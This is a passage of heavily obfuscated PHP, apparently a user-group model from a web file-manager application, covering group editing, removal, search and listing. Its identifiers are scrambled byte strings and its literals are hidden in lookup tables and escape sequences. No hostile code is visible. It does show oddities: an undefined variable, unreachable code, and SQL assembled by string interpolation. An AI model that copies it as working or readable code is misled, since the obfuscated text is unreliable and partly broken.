$ŠßÊÙÃ[$ÀôÈåú[32]]); if (isset($°Èƒ˜œŠ[$ÀôÈåú[2070]])) { $this->metaSet($ŞäĞÅ¹Ô, array($ÀôÈåú[2070] => $°Èƒ˜œŠ[$ÀôÈåú[2070]], $ÀôÈåú[2071] => $°Èƒ˜œŠ[$ÀôÈåú[2071]])); unset($°Èƒ˜œŠ[$ÀôÈåú[2070]]); unset($°Èƒ˜œŠ[$ÀôÈåú[2071]]); } Model($ÀôÈåú[1428])->groupRootAdd($ŞäĞÅ¹Ô); $this->_clearCache($°Èƒ˜œŠ[$ÀôÈåú[192]]); return $ŞäĞÅ¹Ô; } protected function groupEdit($²Ç½âƒø, $ıåÃ­ø) { $ƒÆâ´êí =& $_SERVER[¶Ô„œ…¯]; $§ªüü²È = $this->getInfoSimple($²Ç½âƒø); if (!$§ªüü²È) { return !1; } if (!empty($ıåÃ­ø[$ƒÆâ´êí[192]])) { $–Ìóé„ğ = $this->getInfoSimple($ıåÃ­ø[$ƒÆâ´êí[192]]); if (!$–Ìóé„ğ) { return !1; } if ($§ªüü²È[$ƒÆâ´êí[1980]] == $–Ìóé„ğ[$ƒÆâ´êí[1980]]) { return !1; } if ($ıåÃ­ø[$ƒÆâ´êí[192]] != $§ªüü²È[$ƒÆâ´êí[192]]) { if ($–Ìóé„ğ[$ƒÆâ´êí[586]] !== $§ªüü²È[$ƒÆâ´êí[586]] && strpos($–Ìóé„ğ[$ƒÆâ´êí[586]], $§ªüü²È[$ƒÆâ´êí[586]] . $§ªüü²È[$ƒÆâ´êí[1980]] . $ƒÆâ´êí[50]) === 0) { return !1; } $ıåÃ­ø[$ƒÆâ´êí[657]] = $–Ìóé„ğ[$ƒÆâ´êí[586]] . $ıåÃ­ø[$ƒÆâ´êí[192]] . $ƒÆâ´êí[50]; $this->_changeChildLevel($§ªüü²È, $–Ìóé„ğ); $this->_clearCache($–Ìóé„ğ[$ƒÆâ´êí[1980]]); $this->_clearCache($§ªüü²È[$ƒÆâ´êí[192]]); } } if (isset($ıåÃ­ø[$ƒÆâ´êí[32]])) { $this->setNamePinyin($²Ç½âƒø, $ıåÃ­ø[$ƒÆâ´êí[32]]); } if (isset($ıåÃ­ø[$ƒÆâ´êí[2070]])) { $this->metaSet($²Ç½âƒø, array($ƒÆâ´êí[2070] => $ıåÃ­ø[$ƒÆâ´êí[2070]], $ƒÆâ´êí[2071] => $ıåÃ­ø[$ƒÆâ´êí[2071]])); unset($ıåÃ­ø[$ƒÆâ´êí[2070]]); unset($ıåÃ­ø[$ƒÆâ´êí[2071]]); } $this->_clearChildrenCache($§ªüü²È); return $this->where(array($ƒÆâ´êí[2072] => $²Ç½âƒø))->save($ıåÃ­ø); } private function _clearChildrenCache($İš˜ø–—) { $ù¥×öğå =& $_SERVER[¶Ô„œ…¯]; $‰ì™™ğ = array($ù¥×öğå[657] => array($ù¥×öğå[617], $İš˜ø–—[$ù¥×öğå[586]] . $İš˜ø–—[$ù¥×öğå[1980]] . $ù¥×öğå[618])); $‚Õñ¶õÚ = $this->field($ù¥×öğå[1980])->where($‰ì™™ğ)->select(); foreach ($‚Õñ¶õÚ as $¦íæ†Îñ) { $this->_clearCache($¦íæ†Îñ[$ù¥×öğå[1980]]); } } private function _clearCache($¶Üœ‚é) { $§æôòøù =& $_SERVER[¶Ô„œ…¯]; $this->cacheFunctionClear($§æôòøù[2066], $¶Üœ‚é); $this->cacheFunctionClear($§æôòøù[2067], $¶Üœ‚é); } private function _changeChildLevel($çæûèç¡, $õ«™ğèä, $šŸè§Ö = false) { $Ê¾Ï€ÓÅ =& $_SERVER[¶Ô„œ…¯]; $µñ›² = $çæûèç¡[$Ê¾Ï€ÓÅ[586]] . $çæûèç¡[$Ê¾Ï€ÓÅ[1980]] . $Ê¾Ï€ÓÅ[50]; $¬ü§É = $õ«™ğèä[$Ê¾Ï€ÓÅ[586]] . $õ«™ğèä[$Ê¾Ï€ÓÅ[1980]] . $Ê¾Ï€ÓÅ[50] . $çæûèç¡[$Ê¾Ï€ÓÅ[1980]] . $Ê¾Ï€ÓÅ[50]; if ($šŸè§Ö) { $¬ü§É = $õ«™ğèä[$Ê¾Ï€ÓÅ[586]] . $õ«™ğèä[$Ê¾Ï€ÓÅ[1980]] . $Ê¾Ï€ÓÅ[50]; } $€¾•ºØ = array($Ê¾Ï€ÓÅ[657] => array($Ê¾Ï€ÓÅ[617], $çæûèç¡[$Ê¾Ï€ÓÅ[586]] . $çæûèç¡[$Ê¾Ï€ÓÅ[1980]] . $Ê¾Ï€ÓÅ[618])); $ş§¿Şå = array($Ê¾Ï€ÓÅ[657] => array($Ê¾Ï€ÓÅ[666], "\162\145\160\x6c\141\143\145\x28\x70\141\162\x65\x6e\164\x4c\x65\166\x65\154\x2c\47{$µñ›²}\47\54\x27{$¬ü§É}\x27\51")); $this->_clearChildrenCache($çæûèç¡); $this->where($€¾•ºØ)->data($ş§¿Şå)->save(); } public function setNamePinyin($ìûå©×è, $ˆÈªÎ· = false) { $àı¤Ó¡Ù =& $_SERVER[¶Ô„œ…¯]; if (!$ˆÈªÎ·) { $ù—”×Û‘ = $this->getInfoSimple($ìûå©×è); $ˆÈªÎ· = $ù—”×Û‘[$àı¤Ó¡Ù[32]]; } if (!Input::check($ˆÈªÎ·, $àı¤Ó¡Ù[660])) { $this->metaSet($ìûå©×è, $àı¤Ó¡Ù[540], null); $this->metaSet($ìûå©×è, $àı¤Ó¡Ù[539], null); return; } $îıç¨Ş• = array($àı¤Ó¡Ù[540] => str_replace($àı¤Ó¡Ù[53], $àı¤Ó¡Ù[12], Pinyin::get($ˆÈªÎ·)), $àı¤Ó¡Ù[539] => Pinyin::get($ˆÈªÎ·, $àı¤Ó¡Ù[661])); $this->metaSet($ìûå©×è, $îıç¨Ş•); } protected function metaSet($£´Óıì, $Î‚†ı¶— = null, $ºç¶Ã‚ = null) { $this->_clearCache($£´Óıì); return parent::metaSet($£´Óıì, $Î‚†ı¶—, $ºç¶Ã‚); } protected function groupStatus($÷ı¨ÄÍ, $ŠıÈçˆç) { $Ç°ùÛ»ı =& $_SERVER[¶Ô„œ…¯]; $æŠ¢ÂÊ¿ = $this->getInfoSimple($÷ı¨ÄÍ); if (!$æŠ¢ÂÊ¿) { return !1; } $this->_clearCache($÷ı¨ÄÍ); return $this->metaSet($÷ı¨ÄÍ, $Ç°ùÛ»ı[828], $ŠıÈçˆç); if ($ŠıÈçˆç == $Ç°ùÛ»ı[91]) { $ĞĞ©¶Ä‚ = $this->parentLevelArray($æŠ¢ÂÊ¿[$Ç°ùÛ»ı[586]]); } else { } $ĞĞ©¶Ä‚[] = $æŠ¢ÂÊ¿[$Ç°ùÛ»ı[1980]]; $ÓÇğ·Ñ¦ = array(); foreach ($ĞĞ©¶Ä‚ as $÷ı¨ÄÍ) { $ÓÇğ·Ñ¦[] = array($Ç°ùÛ»ı[1980] => $÷ı¨ÄÍ, $Ç°ùÛ»ı[97] => $Ç°ùÛ»ı[828], $Ç°ùÛ»ı[452] => $ŠıÈçˆç); $this->_clearCache($÷ı¨ÄÍ); } return Model($Ç°ùÛ»ı[2073])->addAll($ÓÇğ·Ñ¦, array(), !0); } protected function groupRemove($¶ˆ¢°±, $¿‘Á”³’ = false) { $“²ç™Š÷ =& $_SERVER[¶Ô„œ…¯]; $ºš–­äÓ = array($“²ç™Š÷[1980] => $¶ˆ¢°±); $‰­İ°ºÂ = $this->where($ºš–­äÓ)->find(); if (!$‰­İ°ºÂ || $‰­İ°ºÂ[$“²ç™Š÷[192]] == 0) { return !1; } if (!$¿‘Á”³’) { $²ÑØ»Á = $this->getInfoSimple($‰­İ°ºÂ[$“²ç™Š÷[192]]); $this->_changeChildLevel($‰­İ°ºÂ, $²ÑØ»Á, !0); $this->where(array($“²ç™Š÷[192] => $¶ˆ¢°±))->save(array($“²ç™Š÷[192] => $‰­İ°ºÂ[$“²ç™Š÷[192]])); $this->_clearCache($²ÑØ»Á[$“²ç™Š÷[1980]]); } Model($“²ç™Š÷[2073])->where($ºš–­äÓ)->delete(); Model($“²ç™Š÷[2074])->where($ºš–­äÓ)->delete(); Model($“²ç™Š÷[903])->groupRootRemove($¶ˆ¢°±); $this->_clearCache($‰­İ°ºÂ[$“²ç™Š÷[192]]); return $this->where($ºš–­äÓ)->delete(); } protected function groupSort($Õä–®›Õ) { $Ÿ–Ç€ŸŞ =& $_SERVER[¶Ô„œ…¯]; $ü•şÑë¯ = array(); foreach ($Õä–®›Õ as $â˜ªÆ¬Œ => $¬é²ü®´) { $ü•şÑë¯[] = array($Ÿ–Ç€ŸŞ[1980], $¬é²ü®´, $Ÿ–Ç€ŸŞ[2004], $â˜ªÆ¬Œ + 1); } $this->saveAll($ü•şÑë¯); } public function listData() { $ÕæâÙæ÷ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÕæâÙæ÷[$_SERVER[¶Ô„œ…¯][447]]); return $ÕæâÙæ÷; } private function _makeOrder($¢Ä¥ƒÃõ = '') { $ƒÔ¨¸Å =& $_SERVER[¶Ô„œ…¯]; $°ÒÂÜ»‹ = array($ƒÔ¨¸Å[1980], $ƒÔ¨¸Å[32], $ƒÔ¨¸Å[1968], $ƒÔ¨¸Å[233]); $ óŸ«¦Û = array($ƒÔ¨¸Å[525] => $ƒÔ¨¸Å[526], $ƒÔ¨¸Å[527] => $ƒÔ¨¸Å[528]); $ü´ïİ÷ = Input::get($ƒÔ¨¸Å[532], $ƒÔ¨¸Å[7], $ƒÔ¨¸Å[1984], $°ÒÂÜ»‹); $±‹«‚ÑÈ = Input::get($ƒÔ¨¸Å[533], $ƒÔ¨¸Å[7], $ƒÔ¨¸Å[2075], array($ƒÔ¨¸Å[2075], $ƒÔ¨¸Å[527])); $±‹«‚ÑÈ = $ óŸ«¦Û[$±‹«‚ÑÈ]; $¢Ä¥ƒÃõ = $¢Ä¥ƒÃõ . "{$ü´ïİ÷}\40{$±‹«‚ÑÈ}\54\x20\x67\x72\157\165\160\x49\x44\x20\141\163\143"; return $this->order($¢Ä¥ƒÃõ); } public function listChild($°Ó«ÇØ™) { $†¾…ÜÚó =& $_SERVER[¶Ô„œ…¯]; $„¬¯·õî = $this->where(array($†¾…ÜÚó[192] => $°Ó«ÇØ™))->_makeOrder()->selectPage(200); $this->_listDataApply($„¬¯·õî[$†¾…ÜÚó[447]]); return $„¬¯·õî; } public function listChildIds($Àåú«ˆÆ) { $÷ïï‡ú =& $_SERVER[¶Ô„œ…¯]; if (is_string($ÕîêÒç)) { $Àåú«ˆÆ = explode($÷ïï‡ú[50], $Àåú«ˆÆ); } $æ—·³œ = $this->where(array($÷ïï‡ú[1980] => array($÷ïï‡ú[7], $Àåú«ˆÆ)))->field($÷ïï‡ú[2076])->select(); if (!$æ—·³œ) { return !1; } $Ğ¡û€Õ‚ = array(); foreach ($æ—·³œ as $õ×à„ÍŠ) { $Ğ¡û€Õ‚[] = "\163\145\154\145\x63\164\40\x67\162\157\165\x70\x49\x44\x20\146\x72\x6f\x6d\40\x60\x67\162\x6f\x75\x70\x60\x20\x77\x68\x65\x72\145\40\160\x61\x72\145\x6e\x74\x4c\145\166\145\154\40\154\x69\x6b\x65\40\47{$õ×à„ÍŠ[$÷ïï‡ú[586]]}{$õ×à„ÍŠ[$÷ïï‡ú[1980]]}\54\x25\x27"; } $Ğ¡û€Õ‚ = implode($÷ïï‡ú[2077], $Ğ¡û€Õ‚); $æ—·³œ = $this->query($Ğ¡û€Õ‚); if (!$æ—·³œ) { return array(); } $Àåú«ˆÆ = array_to_keyvalue($æ—·³œ, $÷ïï‡ú[12], $÷ïï‡ú[1980]); return array_unique($Àåú«ˆÆ); } public function listByID($Ëş®ùè¹) { $‚´ñë¡‹ =& $_SERVER[¶Ô„œ…¯]; if (!$Ëş®ùè¹) { return array(); } $™×ÓôÀ© = array($‚´ñë¡‹[1980] => array($‚´ñë¡‹[7], $Ëş®ùè¹)); $Æ‚Ç¨Ü€ = $this->where($™×ÓôÀ©)->select(); $Æ‚Ç¨Ü€ = array_sort_keep($Æ‚Ç¨Ü€, $‚´ñë¡‹[1980], $Ëş®ùè¹); $this->_listDataApply($Æ‚Ç¨Ü€); return $Æ‚Ç¨Ü€; } public function listSearch($ÑáÏ¿şÏ) { $™„ùı‡Î =& $_SERVER[¶Ô„œ…¯]; $Íç«õ•† = trim($ÑáÏ¿şÏ[$™„ùı‡Î[2078]]); $×­êÄ’‹ = explode($™„ùı‡Î[53], $Íç«õ•†); if (!$Íç«õ•† || count($×­êÄ’‹) == 1) { return $this->listSearchNow($ÑáÏ¿şÏ); } $ù‹ËÉ¯Œ = array($™„ùı‡Î[447] => array()); foreach ($×­êÄ’‹ as $íÅ¦ŒÉå) { if (!trim($íÅ¦ŒÉå)) { continue; } $ÑáÏ¿şÏ[$™„ùı‡Î[2078]] = $íÅ¦ŒÉå; $›şøó‘ë = $this->listSearchNow($ÑáÏ¿şÏ); $ù‹ËÉ¯Œ[$™„ùı‡Î[447]] = array_merge($ù‹ËÉ¯Œ[$™„ùı‡Î[447]], $›şøó‘ë[$™„ùı‡Î[447]]); } $ù‹ËÉ¯Œ[$™„ùı‡Î[447]] = array_unique_by_key($ù‹ËÉ¯Œ[$™„ùı‡Î[447]], $™„ùı‡Î[1980]); $ù‹ËÉ¯Œ[$™„ùı‡Î[444]] = array($™„ùı‡Î[445] => count($ù‹ËÉ¯Œ[$™„ùı‡Î[447]]), $™„ùı‡Î[441] => 20, $™„ùı‡Î[430] => 1, $™„ùı‡Î[446] => 1); return $ù‹ËÉ¯Œ; } public function listSearchNow($ƒƒ˜ò¬¼) { $‘ÉŒ¤¡¹ =& $_SERVER[¶Ô„œ…¯]; $‰¹ª©ú™ = trim($ƒƒ˜ò¬¼[$‘ÉŒ¤¡¹[2078]]); $Ñğ÷íÇ÷ = isset($ƒƒ˜ò¬¼[$‘ÉŒ¤¡¹[2079]]) ? $ƒƒ˜ò¬¼[$‘ÉŒ¤¡¹[2079]] : !1; if (!trim($‰¹ª©ú™)) { return !1; } $‰¹ª©ú™ = str_replace($‘ÉŒ¤¡¹[2080], $‘ÉŒ¤¡¹[2081], $‰¹ª©ú™); $ÆÙ…µÛ• = array($‘ÉŒ¤¡¹[1980] => array($‘ÉŒ¤¡¹[461], "{$‰¹ª©ú™}\x25"), $‘ÉŒ¤¡¹[32] => array($‘ÉŒ¤¡¹[461], "\45{$‰¹ª©ú™}\45"), $‘ÉŒ¤¡¹[1084] => $‘ÉŒ¤¡¹[2082]); if ($Ñğ÷íÇ÷) { $Ï‡‡»Á€ = $this->getInfoSimple($Ñğ÷íÇ÷); $º€¥ùœŞ = $Ï‡‡»Á€[$‘ÉŒ¤¡¹[586]] . $Ñğ÷íÇ÷ . $‘ÉŒ¤¡¹[618]; $ÆÙ…µÛ• = array($ÆÙ…µÛ•, array($‘ÉŒ¤¡¹[586] => array($‘ÉŒ¤¡¹[461], $º€¥ùœŞ))); } $ÆÙ…µÛ• = $this->parseWhereLike($ÆÙ…µÛ•); $¦”Ï½¢İ = $this->_makeOrder()->where($ÆÙ…µÛ•)->selectPage(20); $¦”Ï½¢İ = $¦”Ï½¢İ ? $¦”Ï½¢İ : array($‘ÉŒ¤¡¹[447] => array(), $‘ÉŒ¤¡¹[444] => array()); if (!$¦”Ï½¢İ || count($¦”Ï½¢İ[$‘ÉŒ¤¡¹[447]]) < 5 && Input::check($‰¹ª©ú™, $‘ÉŒ¤¡¹[395])) { $ø÷¼ÃÆË = $this->groupChildrenAll($Ñğ÷íÇ÷); $í‰Ì»‚ = $this->_searchFromMeta($‘ÉŒ¤¡¹[539], $‰¹ª©ú™, 10, $ø÷¼ÃÆË); $Õ™Í½ = $this->_searchFromMeta($‘ÉŒ¤¡¹[540], $‰¹ª©ú™, 10, $ø÷¼ÃÆË); $ˆ™Ã‰ÜÓ = array_merge($í‰Ì»‚, $Õ™Í½, $¦”Ï½¢İ[$‘ÉŒ¤¡¹[447]]); $¦”Ï½¢İ[$‘ÉŒ¤¡¹[447]] = array_unique_by_key($ˆ™Ã‰ÜÓ, $‘ÉŒ¤¡¹[1980]); $¦”Ï½¢İ[$‘ÉŒ¤¡¹[444]][$‘ÉŒ¤¡¹[445]] = count($¦”Ï½¢İ[$‘ÉŒ¤¡¹[447]]); $¦”Ï½¢İ[$‘ÉŒ¤¡¹[444]][$‘ÉŒ¤¡¹[446]] = ceil($¦”Ï½¢İ[$‘ÉŒ¤¡¹[444]][$‘ÉŒ¤¡¹[445]] / $¦”Ï½¢İ[$‘ÉŒ¤¡¹[444]][$‘ÉŒ¤¡¹[441]]); } $this->_listDataApply($¦”Ï½¢İ[$‘ÉŒ¤¡¹[447]]); return $¦”Ï½¢İ; } protected function groupChildrenAll($Ô€ùå¤¥) { $ğ¨¦ğ‚œ =& $_SERVER[¶Ô„œ…¯]; if (!$Ô€ùå¤¥) { return !1; } if (!is_array($Ô€ùå¤¥)) { $Ô€ùå¤¥ = array($Ô€ùå¤¥); } $Î‰¥©œ = $Ô€ùå¤¥; foreach ($Ô€ùå¤¥ as $˜‰ÎÈŸî) { $‘¾øĞú¬ = $this->getInfoSimple($˜‰ÎÈŸî); $§ñ½‰ªé = array($ğ¨¦ğ‚œ[586] => array($ğ¨¦ğ‚œ[461], $‘¾øĞú¬[$ğ¨¦ğ‚œ[586]] . $˜‰ÎÈŸî . $ğ¨¦ğ‚œ[618])); $™¤¥¹ì = $this->field($ğ¨¦ğ‚œ[1980])->where($§ñ½‰ªé)->select(); $Î‰¥©œ = array_merge($Î‰¥©œ, array_to_keyvalue($™¤¥¹ì, $ğ¨¦ğ‚œ[12], $ğ¨¦ğ‚œ[1980])); } return array_unique($Î‰¥©œ); } private function _searchFromMeta($¯¤ùåƒ, $‚ê˜ÙŸ¼, $ÈìÍõ“, $Â­å‘»¬) { $ÎÍ‡Ü„  =& $_SERVER[¶Ô„œ…¯]; $‚ê˜ÙŸ¼ = strtolower($‚ê˜ÙŸ¼); $–óİÈ–ú = array($ÎÍ‡Ü„ [97] => $¯¤ùåƒ, $ÎÍ‡Ü„ [452] => array($ÎÍ‡Ü„ [461], "\x25{$‚ê˜ÙŸ¼}\45")); $–óİÈ–ú = $this->parseWhereLike($–óİÈ–ú); if ($Â­å‘»¬) { $–óİÈ–ú[$ÎÍ‡Ü„ [1980]] = array($ÎÍ‡Ü„ [7], $Â­å‘»¬); } $³ºÇı’ = Model($ÎÍ‡Ü„ [2083])->where($–óİÈ–ú)->limit($ÈìÍõ“)->select(); if (!$³ºÇı’) { return array(); } $³ºÇı’ = array_to_keyvalue($³ºÇı’, $ÎÍ‡Ü„ [12], $ÎÍ‡Ü„ [1980]); $¨´ŞÔ = $this->where(array($ÎÍ‡Ü„ [2072] => array($ÎÍ‡Ü„ [7], $³ºÇı’)))->select(); if (!$¨´ŞÔ) { return array(); } return $¨´ŞÔ; } protected function _listDataApplyItem($²ÄÜÁåò) { $Öº‰çŒ = array($²ÄÜÁåò); $this->_listDataApply($Öº‰çŒ); return $Öº‰çŒ[0]; } protected function _listDataApply(&$§¯£×Ş„) { $°ûÖñş­ =& $_SERVER[¶Ô„œ…¯]; if (!$§¯£×Ş„) { return; } $§¤’à‘ = array_to_keyvalue($§¯£×Ş„, $°ûÖñş­[12], $°ûÖñş­[1980]); $this->_listAppendChildren($§¯£×Ş„); $this->_listAppendChildrenMember($§¯£×Ş„); $this->_listAppendMeta($§¯£×Ş„, $§¤’à‘); $this->_listAppendParent($§¯£×Ş„); $this->_listAppendSourceRoot($§¯£×Ş„, $§¤’à‘); } private function _listAppendChildren(&$¢”ÙáÊò) { $ñ—øĞ½Á =& $_SERVER[¶Ô„œ…¯]; $€’«ß–¢ = array_to_keyvalue($¢”ÙáÊò, $ñ—øĞ½Á[12], $ñ—øĞ½Á[1980]); $•ø§ä®Á = array($ñ—øĞ½Á[192] => array($ñ—øĞ½Á[7], $€’«ß–¢)); $üÂÎÇà† = array($ñ—øĞ½Á[192], $ñ—øĞ½Á[2084] => $ñ—øĞ½Á[567]); $”ä»ö½ì = $this->field($üÂÎÇà†)->where($•ø§ä®Á)->group($ñ—øĞ½Á[192])->select(); $åàË½·ô = array_to_keyvalue($”ä»ö½ì, $ñ—øĞ½Á[192], $ñ—øĞ½Á[567]); foreach ($¢”ÙáÊò as &$ãä½Ã»Å) { $†ş²õñ = $ãä½Ã»Å[$ñ—øĞ½Á[1980]]; $ãä½Ã»Å[$ñ—øĞ½Á[2085]] = isset($åàË½·ô[$†ş²õñ]) ? intval($åàË½·ô[$†ş²õñ]) : !1; } unset($ãä½Ã»Å); } private function _listAppendChildrenMember(&$Äß›—¿) { $Ó³Ü¹Íà =& $_SERVER[¶Ô„œ…¯]; $ƒ‚ø¤Ñı = array_to_keyvalue($Äß›—¿, $Ó³Ü¹Íà[12], $Ó³Ü¹Íà[1980]); $ûßØÃˆ = array($Ó³Ü¹Íà[1980] => array($Ó³Ü¹Íà[7], $ƒ‚ø¤Ñı)); $•‹•®„é = array($Ó³Ü¹Íà[1980], $Ó³Ü¹Íà[2084] => $Ó³Ü¹Íà[567]); $ÀñÜ¶Š¡ = Model($Ó³Ü¹Íà[2074])->field($•‹•®„é)->where($ûßØÃˆ)->group($Ó³Ü¹Íà[1980])->select(); $È…¡éÌ‡ = array_to_keyvalue($ÀñÜ¶Š¡, $Ó³Ü¹Íà[1980], $Ó³Ü¹Íà[567]); foreach ($Äß›—¿ as &$íˆØô®İ) { $ª¬´»êÕ = $íˆØô®İ[$Ó³Ü¹Íà[1980]]; $íˆØô®İ[$Ó³Ü¹Íà[2086]] = isset($È…¡éÌ‡[$ª¬´»êÕ]) ? intval($È…¡éÌ‡[$ª¬´»êÕ]) : !1; } unset($íˆØô®İ); } private function _listAppendMeta(&$•í®ö²Ó, $®Ÿ”­¨) { $‰¹íÍËâ =& $_SERVER[¶Ô„œ…¯]; $«ğ¥úø„ = array($‰¹íÍËâ[1980] => array($‰¹íÍËâ[7], $®Ÿ”­¨)); $™ö™²İ¹ = Model($‰¹íÍËâ[2073])->where($«ğ¥úø„)->select(); $™ö™²İ¹ = array_to_keyvalue_group($™ö™²İ¹, $‰¹íÍËâ[1980]); foreach ($™ö™²İ¹ as &$ßòÂ å) { $ßòÂ å = array_to_keyvalue($ßòÂ å, $‰¹íÍËâ[97], $‰¹íÍËâ[452]); } unset($ßòÂ å); foreach ($•í®ö²Ó as &$ô©ş«Ëö) { $ô©ş«Ëö[$‰¹íÍËâ[541]] = array(); if (isset($™ö™²İ¹[$ô©ş«Ëö[$‰¹íÍËâ[1980]]])) { $ô©ş«Ëö[$‰¹íÍËâ[541]] = $™ö™²İ¹[$ô©ş«Ëö[$‰¹íÍËâ[1980]]]; } } unset($ô©ş«Ëö); } protected function parentLevelArray($ÊœÉÄÈç) { $ö•ÎÈãÌ =& $_SERVER[¶Ô„œ…¯]; $ÊœÉÄÈç = explode($ö•ÎÈãÌ[50], trim($ÊœÉÄÈç, $ö•ÎÈãÌ[50])); $ÊœÉÄÈç = array_remove_value($ÊœÉÄÈç, $ö•ÎÈãÌ[230]); return $ÊœÉÄÈç; } protected function parentInGroup($˜¶²Ğ¡Ë, $¹ê‡€Ô) { $Ğß·²µø =& $_SERVER[¶Ô„œ…¯]; $Ğ’¥ìÀ‘ = $this->getInfoSimple($˜¶²Ğ¡Ë); if (!$Ğ’¥ìÀ‘) { return !0; } $Ù–Òæœ© = $this->parentLevelArray($Ğ’¥ìÀ‘[$Ğß·²µø[586]]); $Ù–Òæœ©[] = $˜¶²Ğ¡Ë; foreach ($Ù–Òæœ© as $˜¶²Ğ¡Ë) { if (in_array($˜¶²Ğ¡Ë . $Ğß·²µø[12], $¹ê‡€Ô)) { return !0; } } return !1; } private function _listAppendParent(&$â„àÜÓÑ) { $ú“²Œãª =& $_SERVER[¶Ô„œ…¯]; $¾Äµ£…‹ = array(); foreach ($â„àÜÓÑ as &$Æ¶•ò±¾) { $¾Äµ£…‹[$Æ¶•ò±¾[$ú“²Œãª[1980]]] = $Æ¶•ò±¾[$ú“²Œãª[32]]; $ªÙÇéğÚ = $this->parentLevelArray($Æ¶•ò±¾[$ú“²Œãª[586]]); foreach ($ªÙÇéğÚ as $¯º•µî) { if (!isset($¾Äµ£…‹[$¯º•µî])) { $¾Äµ£…‹[$¯º•µî] = 0; } } } unset($Æ¶•ò±¾); foreach ($¾Äµ£…‹ as $£ÀæëŒ— => $´ÍàÙë) { if ($´ÍàÙë) { continue; } $ë¾­ÅÄ“ = $this->getInfoSimple($£ÀæëŒ—); $¾Äµ£…‹[$£ÀæëŒ—] = $ë¾­ÅÄ“[$ú“²Œãª[32]]; } $ÕÇÙ¥ç€ = $GLOBALS[$ú“²Œãª[6]][$ú“²Œãª[92]][$ú“²Œãª[2087]]; if (KodUser::isRoot()) { $ÕÇÙ¥ç€ = !1; } foreach ($â„àÜÓÑ as &$Æ¶•ò±¾) { $ªÙÇéğÚ = $this->parentLevelArray($Æ¶•ò±¾[$ú“²Œãª[586]]); $Ãß’çÆƒ = $ú“²Œãª[12]; foreach ($ªÙÇéğÚ as $£ÀæëŒ— => $¯º•µî) { if ($ÕÇÙ¥ç€ && $£ÀæëŒ— == 0) { continue; } $Ãß’çÆƒ .= $¾Äµ£…‹[$¯º•µî] . $ú“²Œãª[8]; } if ($ªÙÇéğÚ) { $Ãß’çÆƒ .= $Æ¶•ò±¾[$ú“²Œãª[32]]; } $Æ¶•ò±¾[$ú“²Œãª[591]] = str_replace($ú“²Œãª[256], $ú“²Œãª[8], $Ãß’çÆƒ); } unset($Æ¶•ò±¾); } private function _listAppendSourceRoot(&$Ôµ»Âô, $Æô—·Á·) { $ä©Í“ =& $_SERVER[¶Ô„œ…¯]; $«©‰àåÁ = Model($ä©Í“[903])->listSourceRoot(SourceModel::TYPE_GROUP, $Æô—·Á·); $«©‰àåÁ = array_to_keyvalue($«©‰àåÁ, $ä©Í“[571]); $«©‰àåÁ = array_remove_key($«©‰àåÁ, $ä©Í“[571]); foreach ($Ôµ»Âô as &$ô£½è¶ë) { $ô£½è¶ë[$ä©Í“[90]] = $«©‰àåÁ[$ô£½è¶ë[$ä©Í“[1980]]] ? $«©‰àåÁ[$ô£½è¶ë[$ä©Í“[1980]]] : array(); } unset($ô£½è¶ë); } protected function groupMerge($ØôŠ½¿ ) { $ØôŠ½¿  = array_values(array_unique($ØôŠ½¿ )); $íÅîù = array(); for ($ªäĞšµË = 0; $ªäĞšµË < count($ØôŠ½¿ ); $ªäĞšµË++) { $ş±ÁÈ‚ = !1; for ($şÔçÉ™ğ = 0; $şÔçÉ™ğ < count($ØôŠ½¿ ); $şÔçÉ™ğ++) { if ($ªäĞšµË == $şÔçÉ™ğ) { continue; } if ($this->isParentOf($ØôŠ½¿ [$şÔçÉ™ğ], $ØôŠ½¿ [$ªäĞšµË])) { $ş±ÁÈ‚ = !0; break; } } if (!$ş±ÁÈ‚) { $íÅîù[] = $ØôŠ½¿ [$ªäĞšµË]; } } return $íÅîù; } protected function isParentOf($”€ûÖÛ¿, $’¨ƒçÇï) { $¯ãÎ‹†Ü =& $_SERVER[¶Ô„œ…¯]; if (!$”€ûÖÛ¿ || !$’¨ƒçÇï || $”€ûÖÛ¿ == $’¨ƒçÇï) { return !1; } $’àçÆÇÎ = $this->getInfoSimple($”€ûÖÛ¿); $éÜÖÛÜ“ = $this->getInfoSimple($’¨ƒçÇï); $¦ÎÑÑà = $’àçÆÇÎ[$¯ãÎ‹†Ü[586]] . $”€ûÖÛ¿ . $¯ãÎ‹†Ü[50]; if (substr($éÜÖÛÜ“[$¯ãÎ‹†Ü[586]], 0, strlen($¦ÎÑÑà)) == $¦ÎÑÑà) { return !0; } return !1; } public function groupShowRoot($¼öæ”å¡, $¤†º£è¾ = false) { $µùùÓ‚÷ =& $_SERVER[¶Ô„œ…¯]; $”–¼áñ = $this->getInfo($¼öæ”å¡); if (!$”–¼áñ) { return array(); } $¯µ¶éÔ¯ = $this->parentLevelArray($”–¼áñ[$µùùÓ‚÷[586]]); $‹á…ò‰ = array($¼öæ”å¡); if (count($¯µ¶éÔ¯) == 0) { return $‹á…ò‰; } if ($¤†º£è¾ && count($¯µ¶éÔ¯) == 1) { return $‹á…ò‰; } if (!$”–¼áñ[$µùùÓ‚÷[541]] || !isset($”–¼áñ[$µùùÓ‚÷[541]][$µùùÓ‚÷[2070]]) || $”–¼áñ[$µùùÓ‚÷[541]][$µùùÓ‚÷[2070]] == $µùùÓ‚÷[854]) { return $this->groupShowRoot($¯µ¶éÔ¯[count($¯µ¶éÔ¯) - 1], $¤†º£è¾); } if ($”–¼áñ[$µùùÓ‚÷[541]][$µùùÓ‚÷[2070]] == $µùùÓ‚÷[434]) { $ïªÇƒœÅ = explode($µùùÓ‚÷[50], $”–¼áñ[$µùùÓ‚÷[541]][$µùùÓ‚÷[2071]]); if ($ïªÇƒœÅ) { $‹á…ò‰ = array_merge($‹á…ò‰, $ïªÇƒœÅ); } } return $‹á…ò‰; } protected function resetParentLevel() { $ üñ¡· =& $_SERVER[¶Ô„œ…¯]; $¡ıöø¼  = $ üñ¡·[1980]; $Ã®¨ƒ = $this->select(); $Ã®¨ƒ = array_to_keyvalue($Ã®¨ƒ, $¡ıöø¼ ); foreach ($Ã®¨ƒ as $„Å¦†ÈÕ) { $äî¼‡Ù = $„Å¦†ÈÕ; $ÇÎÏ“ø = array(); while ($äî¼‡Ù[$ üñ¡·[192]] != 0) { $ÇÎÏ“ø[] = $äî¼‡Ù[$ üñ¡·[192]]; $äî¼‡Ù = $Ã®¨ƒ[$äî¼‡Ù[$ üñ¡·[192]]]; } $ÇÎÏ“ø[] = 0; $ÇÎÏ“ø = $ üñ¡·[50] . implode($ üñ¡·[50], 